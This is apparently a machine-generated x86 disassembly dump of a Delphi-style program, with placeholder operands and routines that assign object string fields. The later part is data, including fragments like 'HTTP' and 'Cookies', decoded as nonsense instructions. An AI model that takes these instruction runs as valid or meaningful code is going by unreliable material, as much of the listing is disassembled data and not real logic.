je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_486541
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_482484
mov esi eax
mov [ ebx + 0x4 ] esi
mov ecx [ ebx + 0x14 ]
mov edx r-xdata
mov eax [ esi + 0x8 ]
call sub_480ea0
mov ecx [ ebx + 0x8 ]
mov edx r-xdata
mov eax [ esi + 0x8 ]
call sub_480ea0
lea edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
jle r-xdata
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax edi
call sub_480ea0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax edi
call sub_480ea0
sub_486589
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] esi
pop esi
pop ebx
retn
lea edx [ ebx + 0x4 ]
mov eax [ r-xdata ]
call sub_462560
sub_4865ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x10 ]
mov eax esi
call sub_464d00
test al al
jne r-xdata
lea eax [ ebx + 0x10 ]
mov edx esi
call sub_404e98
pop esi
pop ebx
retn
lea edx [ ebx + 0x4 ]
mov eax [ r-xdata ]
call sub_462560
sub_4865dc
push ebp
mov ebp esp
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_486741
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_485c74
mov esi [ ebx + 0x8 ]
lea ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x68 ]
call sub_404e98
lea ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov edx [ ebp - 0x10 ]
lea eax [ ebx + 0x6c ]
call sub_404e98
lea ecx [ ebp - 0x14 ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov edx [ ebp - 0x14 ]
lea eax [ ebx + 0x70 ]
call sub_404e98
lea ecx [ ebp - 0x18 ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov edx [ ebp - 0x18 ]
lea eax [ ebx + 0x74 ]
call sub_404e98
lea ecx [ ebp - 0x1c ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov edx [ ebp - 0x1c ]
lea eax [ ebx + 0x90 ]
call sub_404e98
lea ecx [ ebp - 0x20 ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov edx [ ebp - 0x20 ]
lea eax [ ebx + 0x7c ]
call sub_404e98
lea ecx [ ebp - 0x24 ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov edx [ ebp - 0x24 ]
lea eax [ ebx + 0x84 ]
call sub_404e98
lea ecx [ ebp - 0x28 ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov edx [ ebp - 0x28 ]
lea eax [ ebx + 0x88 ]
call sub_404e98
lea ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_480c80
lea eax [ ebp - 0x8 ]
call sub_404e44
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
jle r-xdata
lea eax [ ebx + 0x98 ]
mov edx [ ebp - 0x8 ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_486748
lea eax [ ebp - 0x28 ]
mov edx 0xa
call sub_404e68
retn
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
sub_4867ff
inc [ ecx ]
add [ eax ] al
add [ 0x53000000 ] bh
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_485b28
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_404114
mov esi eax
lea eax [ esi + 0x68 ]
mov edx [ ebx + 0x68 ]
call sub_404e98
lea eax [ esi + 0x6c ]
mov edx [ ebx + 0x6c ]
call sub_404e98
lea eax [ esi + 0x70 ]
mov edx [ ebx + 0x70 ]
call sub_404e98
lea eax [ esi + 0x74 ]
mov edx [ ebx + 0x74 ]
call sub_404e98
lea eax [ esi + 0x7c ]
mov edx [ ebx + 0x7c ]
call sub_404e98
lea eax [ esi + 0x8c ]
mov edx [ ebx + 0x8c ]
call sub_404e98
lea eax [ esi + 0x80 ]
mov edx [ ebx + 0x80 ]
call sub_404e98
lea eax [ esi + 0x84 ]
mov edx [ ebx + 0x84 ]
call sub_404e98
lea eax [ esi + 0x88 ]
mov edx [ ebx + 0x88 ]
call sub_404e98
movzx eax [ ebx + 0x9c ]
mov [ esi + 0x9c ] al
lea eax [ esi + 0x98 ]
mov edx [ ebx + 0x98 ]
call sub_404e98
pop esi
pop ebx
retn
sub_4868dc
push ebx
mov ebx eax
lea eax [ ebx + 0x68 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x6c ]
call sub_404e44
lea eax [ ebx + 0x88 ]
mov edx r-xdata
call sub_404e98
mov [ ebx + 0x9c ] 0x0
lea eax [ ebx + 0x98 ]
call sub_404e44
mov eax ebx
call sub_485bec
pop ebx
retn
sub_486967
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_486baf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_486060
mov esi [ ebx + 0x8 ]
mov eax [ ebx + 0x94 ]
call sub_405120
test eax eax
jle r-xdata
mov eax [ ebx + 0x90 ]
call sub_405120
test eax eax
jle r-xdata
mov ecx [ ebx + 0x94 ]
mov edx r-xdata
mov eax esi
call sub_480ea0
mov eax [ ebx + 0x68 ]
call sub_405120
test eax eax
jle r-xdata
mov ecx [ ebx + 0x90 ]
mov edx r-xdata
mov eax esi
call sub_480ea0
mov eax [ ebx + 0x6c ]
call sub_405120
test eax eax
jle r-xdata
mov ecx [ ebx + 0x68 ]
mov edx r-xdata
mov eax esi
call sub_480ea0
mov eax [ ebx + 0x70 ]
call sub_405120
test eax eax
jle r-xdata
mov ecx [ ebx + 0x6c ]
mov edx r-xdata
mov eax esi
call sub_480ea0
mov eax [ ebx + 0x74 ]
call sub_405120
test eax eax
jle r-xdata
mov ecx [ ebx + 0x70 ]
mov edx r-xdata
mov eax esi
call sub_480ea0
mov eax [ ebx + 0x7c ]
call sub_405120
test eax eax
jle r-xdata
mov ecx [ ebx + 0x74 ]
mov edx r-xdata
mov eax esi
call sub_480ea0
mov eax [ ebx + 0x84 ]
call sub_405120
test eax eax
jle r-xdata
mov ecx [ ebx + 0x7c ]
mov edx r-xdata
mov eax esi
call sub_480ea0
mov eax [ ebx + 0x88 ]
call sub_405120
test eax eax
jle r-xdata
mov ecx [ ebx + 0x84 ]
mov edx r-xdata
mov eax esi
call sub_480ea0
mov eax [ ebx + 0x98 ]
call sub_405120
test eax eax
jle r-xdata
mov ecx [ ebx + 0x88 ]
mov edx r-xdata
mov eax esi
call sub_480ea0
fld [ ebx + 0x58 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
jbe r-xdata
lea eax [ ebp - 0x8 ]
mov ecx [ ebx + 0x98 ]
mov edx r-xdata
call sub_405170
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_480ea0
mov edi [ ebx + 0xa0 ]
test edi edi
je r-xdata
push [ ebx + 0x5c ]
push [ ebx + 0x58 ]
lea edx [ ebp - 0xc ]
mov eax [ r-xdata ]
call sub_462944
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_480ea0
cmp [ ebx + 0x9c ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_486bb6
mov dl 0x1
mov eax [ r-xdata ]
call sub_482484
mov edi eax
mov [ ebx + 0xa0 ] edi
mov eax [ edi + 0x8 ]
mov ecx [ ebx + 0x8c ]
mov edx r-xdata
call sub_480ea0
mov eax [ edi + 0x8 ]
mov ecx [ ebx + 0x80 ]
mov edx r-xdata
call sub_480ea0
lea edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
jle r-xdata
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_480ea0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_480ea0
sub_486cf5
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_404330
mov ebx edx
mov esi eax
cmp [ esi + 0xa0 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_485ae8
test bl bl
jle r-xdata
lea edx [ esi + 0xa0 ]
mov eax [ r-xdata ]
call sub_462560
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_486d38
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_485a80
lea eax [ esi + 0x38 ]
mov edx r-xdata
call sub_404e98
mov dl 0x1
mov eax [ r-xdata ]
call sub_480820
mov [ esi + 0x7c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_480820
mov [ esi + 0x78 ] eax
lea eax [ esi + 0x68 ]
call sub_404e44
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_486db2
add [ eax ] al
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
lea edx [ esi + 0x7c ]
mov eax [ r-xdata ]
call sub_462560
lea edx [ esi + 0x78 ]
mov eax [ r-xdata ]
call sub_462560
mov edx ebx
and dl 0xfc
mov eax esi
call sub_485ae8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_486e14
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_486eea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_485c74
mov esi [ ebx + 0x8 ]
lea ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x6c ]
call sub_404e98
lea ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x70 ]
call sub_404e98
lea ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x74 ]
call sub_404e98
mov eax [ ebx + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov ecx [ ebx + 0x7c ]
mov edx r-xdata
mov eax esi
call sub_48091c
mov eax [ ebx + 0x78 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov ecx [ ebx + 0x78 ]
mov edx r-xdata
mov eax esi
call sub_48091c
lea ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov edx [ ebp - 0x10 ]
lea eax [ ebx + 0x68 ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_486ef1
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404e68
retn
sub_486f86
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
xor edx edx
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4870cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_486060
mov eax ebx
call sub_486354
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x2
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebx + 0x28 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] 0x10
mov [ ebp - 0x1c ] 0x2d
mov [ ebp - 0x18 ] 0x2
lea eax [ ebx + 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x10
lea ecx [ ebp - 0x24 ]
mov edx r-xdata
mov eax [ r-xdata ]
call sub_4624e8
mov eax [ ebp - 0xc ]
push eax
mov eax ebx
call sub_486354
mov ecx r-xdata
pop edx
call sub_463d18
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebx + 0x30 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0x10
lea ecx [ ebp - 0x30 ]
mov edx r-xdata
mov eax [ r-xdata ]
call sub_4624e8
mov eax [ ebp - 0x28 ]
push eax
mov eax ebx
call sub_486368
mov ecx r-xdata
pop edx
call sub_463d18
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x34 ]
mov edx 0x4
call sub_4051e4
mov ecx [ ebp - 0x34 ]
mov edx r-xdata
mov eax [ ebx + 0x8 ]
call sub_480ea0
mov eax ebx
call sub_486368
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4870d6
mov ecx [ ebx + 0x68 ]
mov edx r-xdata
mov eax [ ebx + 0x8 ]
call sub_480ea0
mov eax [ ebx + 0x68 ]
call sub_405120
test eax eax
jle r-xdata
sub_4871a3
dec [ ecx ]
add [ eax ] al
add [ ebp + 0x78 ] dh
je r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
enter 0x4871 0x0
punpckhbw mm5 [ edi + 0x49 ]
outsb
push eax
jb r-xdata
push 0x6c6d74
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x68 ]
mov edx esi
call sub_404e98
pop esi
pop ebx
retn
outsb
add [ eax ] eax
add [ eax ] al
arpl [ ebp + 0x73 ] sp
jae r-xdata
add eax 0x65530608
outsb
jb r-xdata
jo r-xdata
jne r-xdata
add [ esp ] eax
jae r-xdata
push esp
arpl [ ecx + eax + 0x4 ] si
jae r-xdata
imul ebp [ edi + 0x6e ] 0x71c80173
dec eax
add [ ebp + 0x72480040 ] cl
dec eax
add [ ebx ] al
push ss
push esp
dec ecx
dec eax
push esp
add [ 0x5f317670 ] al
xor [ 0x5f317670 ] al
dec eax
push 0x4b6f6812
jo r-xdata
add ecx [ eax ]
push es
push es
jae r-xdata
imul esi [ edx + 0x65 ] 0x49077463
je r-xdata
push esp
push eax
push eax
jb r-xdata
jb r-xdata
or [ eax ] cl
inc ecx
dec eax
popad
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x8 ] si
push ebx
outsb
jb r-xdata
jb r-xdata
outsb
je r-xdata
arpl [ gs : edi + eax + 0x49 ] si
arpl [ edi + 0x6c ] bp
push esi
jb r-xdata
push eax
jb r-xdata
popad
jae r-xdata
or eax 0x48644954
popad
jb r-xdata
insb
popad
bound ebp [ ebp ]
outsb
add [ bp + di ] ecx
dec esi
jne r-xdata
dec eax
popad
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ edi ] eax
push esi
dec ebp
je r-xdata
pop es
add [ edi ] eax
add [ ecx ] al
add [ eax ] al
add [ edx + esi * 2 + 0x48 ] al
imul ebp [ edi + 0x6e ] 0x1
jbe r-xdata
je r-xdata
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] 0x64495411
push ss
jb r-xdata
imul esi [ ebx + 0x74 ] 0x43560901
jb r-xdata
outsb
push edx
imul esi [ fs : edx + 0x65 ] 0x49077463
je r-xdata
outsd
push es
jae r-xdata
dec edi
bound ebp [ edx + 0x65 ]
xor [ esi ] eax
dec ecx
dec eax
push esp
pop edi
arpl [ edi + 0x6c ] bp
adc ebp [ eax + 0x6f ]
inc esi
outsd
jb r-xdata
insd
dec eax
add [ eax ] ch
pop ebx
push 0x69746e65
jne r-xdata
dec ecx
inc ecx
push 0x69746e65
add [ ebx ] edx
inc ecx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x13 ] si
outsb
outsb
jne r-xdata
outsd
outsb
je r-xdata
push esi
inc ebx
or [ esi + 0x43 ] edx
popad
outsb
add [ eax ] dl
adc [ eax ] eax
hlt
jb r-xdata
inc ebp
outsb
arpl [ edi + 0x64 ] bp
push eax
popad
jb r-xdata
dec eax
add [ eax ] bh
insd
dec eax
add [ eax + ebx * 4 + 0xe0048 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
mov al 0x10
inc eax
add [ eax + 0xf000000 ] cl
add [ esi + ebp * 2 ] dl
dec eax
add al bh
je r-xdata
outsd
or [ ecx + 0x75 ] al
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xe ] si
push 0x69746e65
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] 0x73616c43
jae r-xdata
je r-xdata
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] 0x73616c43
jae r-xdata
je r-xdata
outsb
pop es
inc edx
outsd
outsd
insb
imul ebp [ esi + 0x75 ] 0x6f420765
outsb
add [ bx + si ] dl
adc [ eax ] eax
mov al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
mov al 0x10
inc eax
add [ ebx + 0x48730cc0 ] cl
add [ eax ] cl
sbb [ ecx + ecx * 2 + 0x64 ] edx
dec eax
push esp
push esp
push eax
dec edi
outsb
dec eax
popad
jb r-xdata
push esp
push eax
test [ edx + 0x48 ] dh
add [ eax ] cl
push ss
push esp
dec ecx
dec eax
push esp
push esp
push eax
dec edi
outsb
push edx
imul esi [ fs : edx + 0x65 ] 0x76457463
outsb
je r-xdata
insd
jae r-xdata
add [ eax + 0x69 ] ch
dec eax
add ah bl
push 0x5a800048
dec eax
add [ ebx + ebx * 4 + 0xe0048 ] dl
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
mov al 0x10
inc eax
add [ eax + eax + 0x10b00000 ] ch
inc eax
add [ eax + 0xe000000 ] dh
push esp
dec ecx
dec eax
push esp
push esp
push eax
push edx
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x43ffb78b ] ah
add [ eax ] al
add [ eax - 0x53ffb7ab ] dh
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ eax ] bl
aas
inc eax
add al bh
insb
dec eax
add [ eax ] cl
push 0x6eb40048
outsd
outsb
jae r-xdata
add [ eax + 0x5000486f ] cl
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl ah
je r-xdata
inc ecx
outsb
adc [ ecx + ecx * 2 + 0x64 ] edx
imul esi [ ebx + 0x74 ] 0x40111000
add [ eax ] al
add [ eax ] al
add ah dh
pop es
dec eax
add [ ebp + 0x73fc0040 ] cl
dec eax
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] 0x61480701
or eax 0x48644954
popad
jb r-xdata
dec ecx
outsb
outsw
dec eax
add [ esi + ebp * 2 + 0x6dc80041 ] dh
inc ecx
add al al
inc ecx
push 0x69746e65
or [ eax ] cl
inc ecx
jne r-xdata
push esp
dec ecx
inc ecx
jne r-xdata
inc ecx
inc eax
outsd
outsb
add [ ebx ] al
or [ esi ] al
push ebx
outsb
jb r-xdata
inc ecx
jbe r-xdata
mov eax eax
sub al 0x72
dec eax
add [ esi ] al
push cs
push esp
dec ecx
dec eax
push esp
push esp
push eax
dec edi
dec ecx
dec eax
push esp
push esp
push eax
add [ eax - 0x64 ] cl
jae r-xdata
add [ ecx + eax * 2 + 0x3efc0040 ] dh
mov eax eax
clc
je r-xdata
push esp
dec ecx
dec eax
push esp
push esp
push eax
push edx
jae r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax - 0x77ffbff0 ] dh
add [ eax ] al
add [ edi ] cl
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ ebp + ebp * 2 + 0x5b280048 ] dh
add [ eax - 0x4c000000 ] bl
pop eax
dec eax
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loop r-xdata
push 0x7a69726f
popad
je r-xdata
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] dl
adc [ eax ] eax
in al 0x1e
dec eax
add [ eax ] al
adc [ eax ] al
mov eax eax
mov al 0x74
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
je r-xdata
push 0x6f666e49
arpl [ gs : ecx + eax * 2 + 0x75 ] si
je r-xdata
imul ebp [ ecx + 0x62 ] 0x300656c
or [ esi ] al
inc ecx
je r-xdata
dec eax
pushfd
lea eax [ eax ]
mov eax 0x7004875
push cs
push esp
dec ecx
dec eax
push esp
push esp
push eax
push edx
jno r-xdata
inc eax
add [ eax + eax + 0x55b00000 ] bh
dec eax
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
add [ edi ] al
andps xmm1 [ ecx + 0x64 ]
dec eax
push esp
push esp
push eax
push edx
jae r-xdata
push esp
dec ecx
dec eax
dec eax
outsd
outsb
add [ ebx ] al
or [ esi ] al
push ebx
outsb
jb r-xdata
hlt
outsd
jb r-xdata
in al 0xf8
inc edi
add [ esp + edi * 8 - 0x67bffb9 ] cl
inc edi
add [ eax ] ch
stc
inc edi
add [ eax + 0x40047f9 ] dl
mov [ 0xffffffffa4440047 ] al
inc edi
add [ edx - 0x5d37ffb9 ] bl
inc edi
add al ch
mov [ 0xffffffff9f100047 ] al
inc edi
add [ ecx - 0x59a7ffb9 ] ch
dec eax
add [ edx + edx * 4 ] dl
dec eax
add [ esp + edx * 4 + 0x7e1c0048 ] ah
dec eax
add [ 0x43644954 ] cl
jne r-xdata
add [ eax + 0x50 ] dh
inc esi
add [ eax + 0xc0048a5 ] ch
inc edi
inc edi
add [ edi + eax * 2 + 0x48140047 ] bl
inc edi
add [ eax - 0x4bffb769 ] dl
test [ edi ] sub_47a370
in al dx
std
inc edi
add ah dl
cli
inc edi
add [ eax - 0x5 ] cl
inc edi
add ah ch
cld
inc edi
add [ edi + esi * 8 - 0x7c3ffb9 ] bh
inc edi
add al ch
std
inc edi
add [ eax - 0x1bffb805 ] ch
clc
in al 0xde
inc ecx
add ah bl
fiadd [ ecx ]
or dl ah
inc ecx
arpl [ edi + 0x6c ] bp
test [ esi + 0x48 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
jae r-xdata
dec eax
outsd
outsb
jae r-xdata
inc ecx
jne r-xdata
or [ esi ] cl
push esp
dec edi
lea eax [ eax ]
cld
jpe r-xdata
inc eax
je r-xdata
add ah ah
fiadd [ ecx ]
add [ eax + 0x1 ] ah
add [ eax ] al
or al 0x9b
inc edi
add al ch
loope r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
ja r-xdata
push 0xa0004875
push esi
dec eax
add [ eax + eax ] bl
push es
dec ecx
dec eax
push esp
push esp
push eax
add [ eax ] al
nop
sub [ esi + 0x48 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
jbe r-xdata
inc ecx
add al cl
insd
inc ecx
add ah bl
add [ 0x64490600 ] dl
dec eax
push esp
push esp
push eax
add [ eax ] al
push 0x4875
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x47ffb78b ] cl
jne r-xdata
mov al 0x74
dec eax
add [ ecx + ebx * 2 + 0x48 ] bl
outsb
outsb
add [ edi ] eax
dec eax
popad
add [ eax ] cl
adc dl [ ecx + ecx * 2 + 0x64 ]
dec edi
outsb
inc ecx
jne r-xdata
add [ eax ] al
je r-xdata
cmp al 0x9c
dec eax
add ah dl
fiadd [ ecx ]
int3
add [ eax ] bl
aas
inc eax
add [ eax + 0x7c ] dh
dec eax
add [ esi + ebp * 2 - 0x2213ffbf ] ch
inc ecx
add al cl
cld
insd
dec eax
push esp
push esp
push eax
mov eax eax
inc esp
ja r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax + 0x7c ] dh
dec eax
add [ esi + ebp * 2 - 0x2213ffbf ] ch
inc ecx
add al cl
insd
inc ecx
add ah al
fiadd [ ecx ]
je r-xdata
add [ ecx + edx * 4 + 0x48 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
ja r-xdata
add [ edi + esi * 2 + 0x48 ] al
add [ eax + eax ] dl
add [ eax ] al
mov esp 0xac004010
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
jae r-xdata
outsd
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
inc eax
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
add [ eax + 0x1 ] ah
add [ eax ] al
cmp [ esi + 0x48 ] dh
add al ch
loope r-xdata
add [ edi ] al
or eax 0x43644954
jne r-xdata
add [ edi ] cl
push esp
dec ecx
dec eax
push esp
push esp
push eax
push eax
jb r-xdata
add ah dl
fiadd [ ecx ]
int3
dec eax
in al 0xf8
inc edi
add [ esp + edi * 8 - 0x67bffb9 ] cl
inc edi
add [ eax ] ch
stc
inc edi
add [ eax + 0x40047f9 ] dl
mov [ 0xffffffffa4440047 ] al
inc edi
add [ edx - 0x5d37ffb9 ] bl
inc edi
add al ch
mov [ 0xffffffff9f100047 ] al
inc edi
add [ ecx - 0x59a7ffb9 ] ch
dec eax
add [ edx + edx * 4 ] dl
dec eax
add [ esp + edx * 4 + 0x7e1c0048 ] ah
dec eax
add [ edi ] al
push esp
dec ecx
dec eax
push esp
push esp
push eax
insb
js r-xdata
add [ eax + 0x50 ] dh
inc esi
add [ eax + 0xc0048a5 ] ch
inc edi
inc edi
add [ edi + eax * 2 + 0x48140047 ] bl
inc edi
add [ eax - 0x4bffb769 ] dl
test [ edi ] sub_47a370
in al dx
std
inc edi
add ah dl
cli
inc edi
add [ eax - 0x5 ] cl
inc edi
add ah ch
cld
inc edi
add [ edi + esi * 8 - 0x7c3ffb9 ] bh
inc edi
add al ch
std
inc edi
add [ eax - 0x1bffb805 ] ch
clc
add ah al
fiadd [ ecx ]
je r-xdata
je r-xdata
inc eax
add [ ecx + eax ] cl
add [ edi ] al
pop es
push esp
dec ecx
dec eax
push esp
push esp
push eax
mov ah 0x77
dec eax
add [ eax + 0x77 ] al
dec eax
add [ eax ] bl
add [ esi ] al
dec ecx
dec eax
push esp
push esp
push eax
adc [ eax ] al
cmp al 0x10
inc eax
add [ ecx + eax ] al
add bh bh
add al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
or [ eax ] al
push cs
dec ebp
popad
js r-xdata
insd
inc ecx
inc edi
add [ eax ] cl
add [ esi ] al
dec ecx
dec eax
push esp
push esp
push eax
add [ eax ] al
mov eax eax
mov ah 0x77
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 + 0x48 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x78 ] ah
dec eax
insd
dec eax
push esp
push esp
push eax
test [ esi + 0x48 ] dh
add [ esp + ebx * 4 ] bh
add [ ecx ] 0x0
add [ eax ] al
outsd
outsd
imul ebp [ ecx + 0x65 ] 0x73
add [ eax ] dl
inc eax
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] al
add [ eax ] al
or al [ eax ]
cmovs esp [ ecx + 0x6e ]
insb
push edx
imul esi [ fs : edx + 0x65 ] 0x44737463
jb r-xdata
jne r-xdata
arpl [ ebp + ecx * 2 + 0x61 ] si
